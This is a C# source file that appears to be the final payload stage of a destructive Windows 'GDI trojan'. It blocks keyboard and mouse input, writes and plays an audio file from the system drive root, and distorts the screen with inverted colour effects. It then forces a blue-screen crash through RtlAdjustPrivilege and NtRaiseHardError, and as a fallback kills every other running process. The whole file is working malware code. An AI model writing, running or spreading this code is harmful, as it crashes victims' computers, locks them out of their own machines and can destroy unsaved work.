using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class FinalPhase
{
    [DllImport("winmm.dll")]
    private static extern uint mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hWndCallback);

    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll.dll")]
    private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    [DllImport("user32.dll")]
    private static extern bool BlockInput(bool fBlockIt);


    public static void StartFinalPhase()
    {
        BlockInput(true);
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        System.IO.File.WriteAllBytes(rootDir + "\\infinity.mp3", Windows_6.Properties.Resources.infinity);
        mciSendString("close infinity", null, 0, IntPtr.Zero);
        mciSendString("open \"" + rootDir + "\\infinity.mp3\" alias infinity", null, 0, IntPtr.Zero);
        mciSendString("play infinity", null, 0, IntPtr.Zero);

        int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right,
            top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
        GDICore.POINT[] thePoints = new GDICore.POINT[3];
        uint[] colors = new uint[] { 0xFF0000, 0xFF00BC, 0xFF700, 0x00FFEF };
        int steps = 0;

        while (steps <= 140)
        {
            IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
            IntPtr mhdc = GDICore.CreateCompatibleDC(hdc);
            IntPtr hbit = GDICore.CreateCompatibleBitmap(hdc, x, y);
            IntPtr holdbit = GDICore.SelectObject(mhdc, hbit);
            thePoints[0].X = left + 50;
            thePoints[0].Y = top - 50;
            thePoints[1].X = right + 50;
            thePoints[1].Y = top + 50;
            thePoints[2].X = left - 50;
            thePoints[2].Y = bottom - 50;
            GDICore.PlgBlt(hdc, thePoints, hdc, left - 20, top - 20, (right - left) + 40, (bottom - top) + 40, IntPtr.Zero, 0, 0);
            GDICore.DeleteDC(hdc);

            hdc = GDICore.GetDC(IntPtr.Zero);
            IntPtr brush = GDICore.CreateSolidBrush(colors[Utils.random.GetRandomInt32(0, colors.Length - 1)]);
            GDICore.SelectObject(hdc, brush);
            GDICore.PatBlt(hdc, 0, 0, x, y, GDICore.TernaryRasterOperations.PATINVERT);
            GDICore.DeleteObject(brush);
            GDICore.DeleteObject(hdc);

            Thread.Sleep(250);
            steps++;
        }

        TriggerBSOD();
    }

    public static void TriggerBSOD()
    {
        try
        {
            Boolean t1;
            uint t2;

            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }
        catch
        {

        }

        foreach (Process process in Process.GetProcesses())
        {
            try
            {
                if (process.Id != Process.GetCurrentProcess().Id)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                    }
                    catch
                    {

                    }

                    try
                    {
                        process.Kill();
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }
    }
}